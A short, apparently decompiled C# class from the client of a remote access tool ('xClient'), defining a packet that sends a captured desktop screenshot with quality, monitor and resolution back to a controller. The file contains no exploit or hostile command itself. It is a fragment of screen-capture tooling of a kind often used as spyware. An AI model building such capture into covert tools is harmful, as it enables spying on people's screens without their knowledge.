using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetDesktopResponse : GInterface4
{
	public byte[] Image { get; set; }

	public int Quality { get; set; }

	public int Monitor { get; set; }

	public string Resolution { get; set; }

	public GetDesktopResponse()
	{
	}

	public GetDesktopResponse(byte[] image, int quality, int monitor, string resolution)
	{
		Image = image;
		Quality = quality;
		Monitor = monitor;
		Resolution = resolution;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
